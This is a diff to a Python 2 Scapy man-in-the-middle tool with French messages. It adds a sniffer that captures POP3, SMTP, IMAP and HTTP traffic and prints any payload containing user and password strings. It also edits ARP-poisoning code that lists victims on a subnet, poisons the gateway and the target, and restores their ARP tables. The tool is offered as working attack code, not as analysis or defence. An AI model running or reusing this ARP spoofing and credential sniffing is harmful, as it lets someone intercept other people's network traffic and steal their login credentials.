@@ -6,6 +6,7 @@ from scapy.layers import  *
 from scapy.error import Scapy_Exception
 import os,sys,threading,signal
 
+from scapy.layers.inet import TCP, IP
 from scapy.layers.l2 import *
 
 from  logger.colorizeStream import ColorizingStreamHandler
@@ -49,6 +50,20 @@ class MITM():
         #logging.error('ERROR')
         #logging.critical('CRITICAL')
 
+    def packet_callback(self,packet):
+        # check to make sure it has a data payload
+        if packet[TCP].payload:
+            mail_packet = str(packet[TCP].payload)
+            if 'user' in mail_packet.lower() and 'pass' in mail_packet.lower():
+                print '[*] Server: %s' % packet[IP].dst
+                print '[*] %s' % packet[TCP].payload
+                print "=" * 75
+                packet.show()
+
+
+    def run_authentifacion_scanner(self):
+        sniff(filter="tcp port 110 or tcp port 25 or tcp port 143 or tcp port 80", prn=self.packet_callback, store=0)
+
     def right_argument(self,input):
         if  input == "o" or input == "O":
             return True
@@ -63,7 +78,7 @@ class MITM():
             logging.warning('Waiting ...')
             res, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=cidr),iface=self.ATTACK_INF["IFACE"],verbose=False,timeout=10)
             j=1
-            logging.info("Liste des victimes disponibles:\n")
+            logging.info("\nListe des victimes disponibles:\n")
             for s,r in res:
                 #print  es[ARP]
                 if r[ARP].psrc == self.ATTACK_INF["GW_IP"] :
@@ -114,12 +129,13 @@ class MITM():
         return arp_target
 
     def restore_target(self,gateway_ip, gateway_mac, target_ip, target_mac):
-        print '[*] Restoring targets...'
+        print '[*] Remise à zéro des targets..'
         send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst='ff:ff:ff:ff:ff:ff', \
             hwsrc=gateway_mac), count=5)
         send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", \
             hwsrc=target_mac), count=5)
-        os.kill(os.getpid(), signal.SIGINT)
+        print "\n pid : "+str(self.ATTACK_INF["pid_th1"])
+        #os.kill(self.ATTACK_INF["pid_th1"], signal.SIGINT)
 
     def stop_attack(self):
         self._is_running = True
@@ -129,7 +145,8 @@ class MITM():
         print "[*] Fin de l'attaque ."
 
     def make_mitm_poison_attack(self,gateway_ip, gateway_mac, target_ip, target_mac):
-        print "\n[*] Lancement de l'attaque. Appuyez sur Ctrl+c pour arreter "
+        self.ATTACK_INF["pid_th1"] = os.getpid()
+        print "\n[*] Lancement de l'attaque.\n"
         vm=self.poison_target(target_ip, target_mac, gateway_ip)
         gw=self.poison_target(gateway_ip, gateway_mac, target_ip)
         continuer = True
@@ -153,6 +170,7 @@ class MITM():
             attack_thread.start()
             scan = raw_input("Tapez Entrer pour arreter l'attaque : ")
             self.stop_attack()
+            print "bjr"
 
         except KeyboardInterrupt:
            #  self.restore_target(self.ATTACK_INF["GW_IP"], self.ATTACK_INF["GW_MA"],self.ATTACK_INF["VM_IP"],self.ATTACK_INF["VM_MA"])
